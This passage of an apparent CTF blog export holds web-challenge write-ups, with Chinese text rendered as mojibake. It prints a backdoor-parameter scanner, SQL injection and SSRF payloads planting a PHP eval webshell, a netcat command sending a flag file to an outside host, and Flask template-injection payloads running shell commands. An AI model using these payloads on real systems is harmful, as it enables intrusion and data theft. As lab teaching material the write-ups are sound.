t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t.start()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> threading.active_count() &lt; <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
<h2 id="2019-å¼ºç½‘æ¯-é«˜æ˜çš„é»‘å®¢">2019 å¼ºç½‘æ¯ é«˜æ˜çš„é»‘å®¢</h2>
<p>ä¸‹è½½æºç æœ‰30mbï¼Œè¶…è¿‡ä¸‰åƒä¸ªæ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶å†…éƒ¨éƒ½æ˜¯ç±»ä¼¼äºè¿™æ ·çš„å†…å®¹</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58483762-6e2b0700-8193-11e9-9d00-fb36d55a8adf.png" alt="image"></p>
<p>å®Œå…¨æ²¡æœ‰åŠæ³•é˜…è¯»ï¼Œè€Œä¸”ä¸å°‘ä»£ç æ˜¯æ— æ•ˆä»£ç ã€‚</p>
<p>ä½†æ˜¯å¾ˆå¤šæ–‡ä»¶å†…éƒ¨éƒ½æœ‰getå’Œpostï¼Œç”šè‡³å¯ä»¥çœ‹è§evalçš„å½±å­ã€‚</p>
<p>æ‰€ä»¥çŒœæµ‹å¯èƒ½æŸä¸ªæ–‡ä»¶å†…çš„æŸä¸ªå‚æ•°æ˜¯æœ‰æ•ˆè€Œä¸”æ˜¯å¯ä»¥æ‰§è¡Œçš„ã€‚</p>
<p>æ‰«æè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Detect</span><span class="params">(file)</span>:</span></span><br><span class="line">    mutex.acquire()</span><br><span class="line">    <span class="keyword">print</span> file</span><br><span class="line">    mutex.release()</span><br><span class="line">    f = open(file, <span class="string">'r'</span>)</span><br><span class="line">    flines = f.readlines()</span><br><span class="line"></span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> flines:</span><br><span class="line">        content += line</span><br><span class="line"></span><br><span class="line">    get_result = re.findall(<span class="string">r"\$_GET\['(.*?)'\]"</span>, content)</span><br><span class="line">    post_result = re.findall(<span class="string">r"\$_POST\['(.*?)'\]"</span>, content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> get_result:</span><br><span class="line">        res = session.get(url + str(file) +<span class="string">"?"</span> + i + <span class="string">"="</span> + <span class="string">"whoami"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'www-data'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            mutex.acquire()</span><br><span class="line">            <span class="keyword">print</span> str(file) + <span class="string">"is vulunable with parameter %s"</span> % i </span><br><span class="line">            finaltarget.append(str(file))</span><br><span class="line">            finaltarget.append(i)</span><br><span class="line">            mutex.release()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> post_result:</span><br><span class="line">        data = &#123;i:<span class="string">"whoami"</span>&#125;</span><br><span class="line">        res = session.post(url + str(file), data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"www-data"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            mutex.acquire()</span><br><span class="line">            <span class="keyword">print</span> str(file) + <span class="string">"is vulunable with post parameter %s"</span> % i</span><br><span class="line">            finaltarget.append(str(file))</span><br><span class="line">            finaltarget.append(i)</span><br><span class="line">            mutex.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    finaltarget = []</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/"</span></span><br><span class="line">    ct = time.time()</span><br><span class="line">    session = requests.session()</span><br><span class="line">    mutex = threading.Lock()</span><br><span class="line">    path = <span class="string">'src/'</span></span><br><span class="line">    files = os.listdir(path)</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        t = threading.Thread(target = Detect, args = (path + file,))</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t.start()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> threading.active_count() &lt; <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> finaltarget</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Time used:"</span></span><br><span class="line">    <span class="keyword">print</span> time.time() - ct</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/58484538-d6c6b380-8194-11e9-8abd-872dfbe583b5.png" alt="image"></p>
<h2 id="ichunqiu-Look">ichunqiu Look</h2>
<p>refresh the page with burpsuite , and here comes the hint:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-HT: verify</span><br></pre></td></tr></table></figure>
<p>and payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?verify=&apos;=0%23</span><br></pre></td></tr></table></figure>
<p>it is the shortest password.</p>
<p>â€¦</p>
<p>â€¦</p>
<p>Got the source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>);</span><br><span class="line">mysql_query(<span class="string">"set names utf8"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"ctf"</span>);</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]==<span class="string">'8.8.8.8'</span>)&#123;</span><br><span class="line">    $name = addslashes($_GET[<span class="string">'usern3me'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos($_GET[<span class="string">'usern3me'</span>],<span class="string">'Bctf2O16'</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        $name = <span class="string">'FUCK'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $name = addslashes($_GET[<span class="string">'usern3me'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello '</span>.$name;</span><br><span class="line">$sql = <span class="string">"select * from admin where name='$name'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$num = mysql_num_rows($result);</span><br><span class="line"><span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;next ***.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>MYSQL ä¸­ utf8_unicode_ci å’Œ utf8_general_ci ä¸¤ç§ç¼–ç æ ¼å¼, utf8_general_ciä¸åŒºåˆ†å¤§å°å†™,<br>
Ã„ = A, Ã– = O, Ãœ = U è¿™ä¸‰ç§æ¡ä»¶éƒ½æˆç«‹, å¯¹äºutf8_general_ciä¸‹é¢çš„ç­‰å¼æˆç«‹ï¼šÃŸ = s<br>
ï¼Œä½†æ˜¯ï¼Œå¯¹äºutf8_unicode_ciä¸‹é¢ç­‰å¼æ‰æˆç«‹ï¼šÃŸ = ss ã€‚<br>
å¯ä»¥çœ‹åˆ°å¤§å†™Oå’ŒÃ–æ˜¯ç›¸ç­‰çš„</p>
</blockquote>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5211ec9dde53ee65bb02225117fba1e1.php?usern3me=Bctf2Ã–16</span><br></pre></td></tr></table></figure>
<p>Got another source code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'path'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    $path = $_GET[<span class="string">'path'</span>];</span><br><span class="line">    $name = <span class="string">"upload/"</span>.$_GET[<span class="string">'filename'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strpos($name,<span class="string">'..'</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'WTF'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($path,<span class="string">'http://127.0.0.1/'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">    file_put_contents($name,file_get_contents($path));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'path error'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>With <code>http://127.0.0.1/</code> been detected, payloads like <code>http://127.0.0.1:test@www.baidu.com</code> can not be used. But we can utilize the page before , as it will show <code>usern3me</code> content on page</p>
<p><img src="https://user-images.githubusercontent.com/40637063/59102510-e1d0cf00-895e-11e9-9d95-66589f9ad9ee.png" alt="image"></p>
<p>so our last payload should be like:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://100a280ce70e4481b698495023409e196beeb4c27c204fdb.changame.ichunqiu.com/c3368f5eb5f8367fd548b228bee69ef2.php?path=http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=&lt;?php @eval($_POST[0]);&gt;&amp;filename=shell.php</span><br></pre></td></tr></table></figure>
<p>and call <code>shell.php</code>, Posting data like</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0=echo `cat ../flag_is_here.php`;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Ps: what if the filter condition was <strong><a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a></strong> instead of <strong><a href="http://127.0.0.1/" target="_blank" rel="noopener">http://127.0.0.1/</a></strong> ? Think about URLâ€™s structure: <strong>scheme://user:pass@host:port/path?query=value#fragment</strong></p>
<p>Using payload <a href="http://127.0.0.1:test@www.baidu.com" target="_blank" rel="noopener">http://127.0.0.1:test@www.baidu.com</a> , you can bypass it and visit <a href="http://baidu.com" target="_blank" rel="noopener">baidu.com</a>.</p>
</blockquote>
<h2 id="ichunqiu-try">ichunqiu try</h2>
<p>to generate hash crash:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'1.txt'</span>,<span class="string">'w+'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">10000000</span>,<span class="number">40000000</span>):</span><br><span class="line">    f.write(str(i) + <span class="string">' '</span> + crypt.crypt(str(i), <span class="string">'$6$rounds=66'</span>))</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"></span><br><span class="line">token_url = <span class="string">"http://902bdd4e83e54133a6f850f6b12c6e236da12c85e6dc43c9.changame.ichunqiu.com/level.php?name=%27%20union%20select%20token%20from%20token%23"</span></span><br><span class="line"></span><br><span class="line">reset_url = <span class="string">"http://902bdd4e83e54133a6f850f6b12c6e236da12c85e6dc43c9.changame.ichunqiu.com/reset.php"</span></span><br><span class="line"></span><br><span class="line">reset_data = &#123;</span><br><span class="line">        <span class="string">"username"</span>:<span class="string">"member"</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_and_get_token</span><span class="params">()</span>:</span></span><br><span class="line">    requests.post(reset_url, data=reset_data)</span><br><span class="line">    res = requests.get(token_url).content</span><br><span class="line">    token = re.findall(<span class="string">r"level is (.*)"</span>, res)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        token = reset_and_get_token()</span><br><span class="line">        f = open(<span class="string">"1.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">        lines = f.read()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">if</span> token <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">print</span> line</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h2 id="ichunqiu-fuzzing">ichunqiu fuzzing</h2>
<p><code>hint: ip,Large internal network</code></p>
<p>trying <code>192.168.0.0</code> (or other ipsegment like <code>10.0.0.0</code>: ) with <code>client-ip</code> or <code>x-forwarded-for</code> â€¦, , and the callback let us show the key,</p>
<blockquote>
<p>ps : several http headers to fake ip:</p>
<p>X-Forwarded-For</p>
<p>Client-ip</p>
<p>x-remote-ip</p>
<p>x-originating-IP</p>
<p>x-remote-addr</p>
</blockquote>
<p>right click in burpsuiteâ€™s repeater and change to requestâ€™s method , add <code>key</code> and send the request â€¦</p>
<p>â€¦</p>
<p>â€¦</p>
<p>finally we got the code as follows and a cipher.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0) &#123;</span><br><span class="line">	$ckey_length = 4;</span><br><span class="line"></span><br><span class="line">	$key = md5($key ? $key : UC_KEY);</span><br><span class="line">	$keya = md5(substr($key, 0, 16));</span><br><span class="line">	$keyb = md5(substr($key, 16, 16));</span><br><span class="line">	$keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">	$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">	$key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">	$string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;%010d&apos;, $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;</span><br><span class="line">	$string_length = strlen($string);</span><br><span class="line"></span><br><span class="line">	$result = &apos;&apos;;</span><br><span class="line">	$box = range(0, 255);</span><br><span class="line"></span><br><span class="line">	$rndkey = array();</span><br><span class="line">	for ($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">		$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for ($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">		$j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">		$tmp = $box[$i];</span><br><span class="line">		$box[$i] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for ($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">		$a = ($a + 1) % 256;</span><br><span class="line">		$j = ($j + $box[$a]) % 256;</span><br><span class="line">		$tmp = $box[$a];</span><br><span class="line">		$box[$a] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if ($operation == &apos;DECODE&apos;) &#123;</span><br><span class="line">		if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) &#123;</span><br><span class="line">			return substr($result, 26);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			return &apos;&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		return $keyc . str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">just decode it using function.</span><br><span class="line"></span><br><span class="line">## ichunqiu not found</span><br><span class="line"></span><br><span class="line">è®¿é—®ï¼ŒæŠ“åŒ…ï¼Œçœ‹å›æ˜¾ï¼š</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57923178-21fadf80-78d4-11e9-88dd-179d35e9cc72.png)</span><br><span class="line"></span><br><span class="line">``X-method`` æ˜¾ç¤ºhahaï¼Œæç¤ºè¯·æ±‚æ–¹æ³•é”™è¯¯ï¼Œå°è¯•``POST`` ``OPTIONS`` ``HEAD`` ä¸‰ç§æ–¹æ³•ä¹‹åï¼Œçœ‹åˆ°``OPTIONS`` çš„å›æ˜¾æœ‰``?f=1.php`` ï¼š</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57923374-b5ccab80-78d4-11e9-8267-fb7d6bf0269a.png)</span><br><span class="line"></span><br><span class="line">å¸¦å‚æ•°è®¿é—®ï¼Œå¯ä»¥çœ‹åˆ°1.phpçš„æºä»£ç ï¼Œä½†æ˜¯è®¿é—®ä¸äº†flag.php å’Œindex.phpï¼Œ </span><br><span class="line"></span><br><span class="line">``Apache`` çš„æ ¹ç›®å½•ä¸‹å¸¸å¸¸æœ‰``.htaccess`` æ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">&gt; .htaccessæ–‡ä»¶(æˆ–è€…&quot;åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶&quot;)æä¾›äº†é’ˆå¯¹æ¯ä¸ªç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œå³åœ¨ä¸€ä¸ªç‰¹å®šçš„ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«æŒ‡ä»¤çš„æ–‡ä»¶ï¼Œå…¶ä¸­çš„æŒ‡ä»¤ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57924740-8455df00-78d8-11e9-946b-7107b2970485.png)</span><br><span class="line"></span><br><span class="line">ç„¶åè®¿é—®ä¸‹é¢çš„htmlï¼Œ</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57924856-deef3b00-78d8-11e9-9cf7-05477e0c1ad7.png)</span><br><span class="line"></span><br><span class="line">æ·»åŠ ``x-forwarded-for: 127.0.0.1`` æ— æ•ˆï¼Œç”¨``client-ip: 127.0.0.1`` å°±å¯ä»¥äº†ã€‚</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57924816-c2530300-78d8-11e9-8199-23ffb61c4149.png)</span><br><span class="line"></span><br><span class="line">## ichunqiu exec</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹æºç æç¤º``vim`` ï¼ŒæŸ¥çœ‹``.index.php.swp`` å¹¶ç”¨vimæ¢å¤ï¼Œå¾—åˆ°ä»¥ä¸‹ä»£ç </span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"> &lt;?php /* flag in flag233.php */  </span><br><span class="line">     function check($number) &#123;</span><br><span class="line">     $one = ord(&apos;1&apos;);</span><br><span class="line">     $nine = ord(&apos;9&apos;);</span><br><span class="line">     for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">     &#123;</span><br><span class="line">         $digit = ord($number&#123;$i&#125;);</span><br><span class="line">         if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">         &#123;</span><br><span class="line">             return false;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return $number == &apos;11259375&apos;;</span><br><span class="line"> &#125;</span><br><span class="line">if(isset($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class="line">    setcookie(&apos;auth&apos;,&apos;tcp tunnel is forbidden!&apos;);</span><br><span class="line">    if(isset($_POST[&apos;cmd&apos;]))&#123;</span><br><span class="line">        $command=$_POST[cmd];</span><br><span class="line">        $result=exec($command);</span><br><span class="line">        //echo $result;</span><br><span class="line">    &#125; &#125;else&#123; 	die(&apos;no sign&apos;); &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè¦æ±‚ä¼ å…¥æ•°æ®å¼±ç­‰äºâ€™11259375â€™ï¼Œä½†æ˜¯æ•°æ®çš„æ¯ä¸€ä½éƒ½ä¸èƒ½åœ¨0-9ä¹‹é—´ï¼Œé‚£ä¹ˆå¯ä»¥ä¼ å…¥<code>11259375</code>  çš„åå…­è¿›åˆ¶ä¹Ÿå°±æ˜¯<code>0xabcdef</code> ï¼Œç„¶åæ‰§è¡Œcmdï¼Œä½†æ˜¯ä»£ç ä¸­è¯´ä¸èƒ½æ‰§è¡Œ<code>tcp</code> çš„è¿æ¥ï¼Œé‚£ä¹ˆé‡‡ç”¨<code>udp</code> çš„æ–¹å¼è¿›è¡Œè¿æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd=nc -u xxx.xxx.xxx.xxx 1111 &lt; flag233.php</span><br></pre></td></tr></table></figure>
<p>æœåŠ¡å™¨å¼€å¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -ul 1111</span><br></pre></td></tr></table></figure>
<p><code>-u</code> æ˜¯å¼€å¯udpæ¨¡å¼çš„æ„æ€ã€‚</p>
<h2 id="ichunqiuç™¾åº¦æ¯-ç™»å½•">ichunqiuç™¾åº¦æ¯ ç™»å½•</h2>
<p>å‰é¢å†…å®¹å’Œæ•°æ®åº“æœ‰å…³ã€‚</p>
<p>ç™»å½•è¿›å»ä¹‹åçœ‹åˆ°æœ‰<code>.bctfg1t</code> å­—æ®µï¼Œåƒæ˜¯<code>.git</code> æ³„éœ²ï¼Œè®¿é—®è¢«403ï¼Œè®¿é—®<code>/.bctfg1t/config</code> æˆåŠŸè¯´æ˜çš„ç¡®æ˜¯gitæ³„éœ²ï¼Œä½¿ç”¨<code>Githack</code> æŠŠå…¨éƒ¨å†…å®¹ä¸‹è½½ä¸‹æ¥ã€‚å¯ä»¥çœ‹è§ä¸€äº›sh1å­—ç¬¦ä¸²ã€‚</p>
<p>ä½¿ç”¨<code>git log</code> æŸ¥çœ‹å†å²ç‰ˆæœ¬ï¼Œä½¿ç”¨å¾—åˆ°çš„<code>commit</code> ç¼–å·è¿›è¡Œ<code>git reset --hard {commit}</code> ï¼Œç„¶è€Œæ²¡æœ‰ç”¨ã€‚</p>
<p>è€ƒå¯Ÿ<code>ç¼“å­˜æœºåˆ¶</code> ï¼Œåœ¨<code>git</code> ä¸­ï¼Œç¼“å­˜å°±æ˜¯<code>stach</code> ï¼Œè¿›å…¥<code>.git/refs/</code> ï¼Œç„¶å<code>cat stach</code> å¾—åˆ°äº†commitï¼Œå›åˆ°ä¸‹è½½çš„æ ¹ç›®å½•æ‰§è¡Œ<code>git reset --hard commit</code> ä¹‹åæŸ¥çœ‹<code>flag.php</code> å°±è¡Œäº†</p>
]]></content>
      <categories>
        <category>é¢˜å‹è®°å½•</category>
      </categories>
  </entry>
  <entry>
    <title>SSTI é¢˜å‹è®°å½•[working forever]</title>
    <url>/2019/05/27/SSTI/</url>
    <content><![CDATA[<h3 id="2018æŠ¤ç½‘æ¯easy-tornado">2018æŠ¤ç½‘æ¯easy_tornado</h3>
<p>tornado SSTI.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511159-69aefc00-aa28-11e9-8de3-1650041e14a1.png" alt="1562241369585"></p>
<p>Observe the url:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web9.buuoj.cn/file?filename=/hints.txt&amp;filehash=bf60e1051f59dbb931208200bcf8c08e</span><br><span class="line">http://web9.buuoj.cn/file?filename=/flag.txt&amp;filehash=245a5ccf5543f16709d8c22851af5454</span><br><span class="line">http://web9.buuoj.cn/file?filename=/welcome.txt&amp;filehash=1e1439df1c0c7eeb9e93a8e44a58bc9f</span><br></pre></td></tr></table></figure>
<p>click into flag.txt, which shows flag is in /fllllllllllag.</p>
<p>click into welcome.txt , which shows just a word <code>render</code>.</p>
<p>click into hint.txt, which shows filehash are generated by <code>md5(cookie_secret+md5(filename))</code></p>
<p>so , the question is , how to get <code>cookie_secret</code> ?While so many keywords were filtered.</p>
<p>In <code>web.py</code> ,we can see that <code>cookie_secret</code> is in <code>RequestHandler.application.settings</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511171-77fd1800-aa28-11e9-85dc-2ec521c8b955.png" alt="1562248424477"></p>
<p>While in <code>auth.py</code> ,there is an object oriented from <code>RequestHandler</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511187-82b7ad00-aa28-11e9-8efe-48dc206a9f74.png" alt="1562248566424"></p>
<p>Obviously, the <code>filehash</code> should be a trick from <a href="http://auth.py" target="_blank" rel="noopener">auth.py</a>(?)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511254-b561a580-aa28-11e9-8e54-c89fcf20690b.png" alt="1562240071849"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511291-ce6a5680-aa28-11e9-8525-0c66dd03c840.png" alt="1562240945347"></p>
<blockquote>
<p>Summary:</p>
<p>Learning to develop is so important.!!!</p>
</blockquote>
<h3 id="ç™¾åº¦æ¯-Fuzz">ç™¾åº¦æ¯ Fuzz</h3>
<p>è€ƒå¯Ÿ<code>Flask</code> æ¨¡æ¿æ³¨å…¥ã€‚</p>
<p>é¦–å…ˆï¼Œä½¿ç”¨Burpsuitçš„<code>Intruder</code>æ¨¡å—ä¸­çš„<code>server-side variable name</code> å­—å…¸æ¥Fuzzï¼Œå‘ç°<code>name</code> å‚æ•°æœ‰ç«¯å€ªã€‚</p>
<p>éšä¾¿åœ¨nameå‚æ•°ä¸­è¾“å…¥ä¸€ç‚¹ä»€ä¹ˆï¼Œé”™è¯¯ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57853604-c1f33300-7818-11e9-8665-a592056576e0.png" alt="image"></p>
<p>å¤§èŸ’è›‡(python) --&gt; Flask æ¨¡æ¿æ³¨å…¥ã€‚ã€‚ã€‚</p>
<p><code>/?name=1</code> é¡µé¢å›æ˜¾<code>Hello 1</code> ç„¶åè¾“å…¥<code>/?name=1</code> å’Œ<code>/?name=</code> å‘ç°ä¹Ÿæ‰§è¡Œäº†ã€‚</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name=%7B%7B &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;from subprocess import check_output\n\nRUNCMD = check_output\n&apos;) %7D%7D</span><br><span class="line"></span><br><span class="line">name=%7B%7B config.from_pyfile(&apos;/tmp/owned.cfg&apos;) %7D%7D </span><br><span class="line"></span><br><span class="line">name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7D</span><br></pre></td></tr></table></figure>
<p><code>''.__class__.__mro__[2].__subclasses__()[40]</code> çš„å‡½æ•°æ˜¯<code>file</code> ï¼Œè¿™é‡Œç¬¬ä¸€ä¸ªpayloadæ˜¯åˆ›å»ºå¹¶å¾€<code>/tmp/owned.cfg</code> å†™ä»£ç ã€‚ç¬¬äºŒä¸ªpayloadæ˜¯è°ƒç”¨æ–‡ä»¶(Flask ä¸­çš„ç”¨æ³•) ã€‚ç¬¬ä¸‰ä¸ªpayloadæ˜¯<code> config[\]('/usr/bin/id', shell=True)</code> ,(åæ–œæ æ˜¯ä¸ºäº†markdownä¸­çš„è½¬ä¹‰)ã€‚</p>
<p>ç„¶åå°è¯•<code>name=%7B%7B%20config[%27RUNCMD%27](%27ls%27,shell=True)%20%7D%7D</code>,å‘ç°è¢«è¿‡æ»¤ï¼Œäºæ˜¯äº§ç”Ÿbase64ç¼–ç ï¼Œæœ€ç»ˆç»“æœå¦‚ä¸‹ï¼š</p>
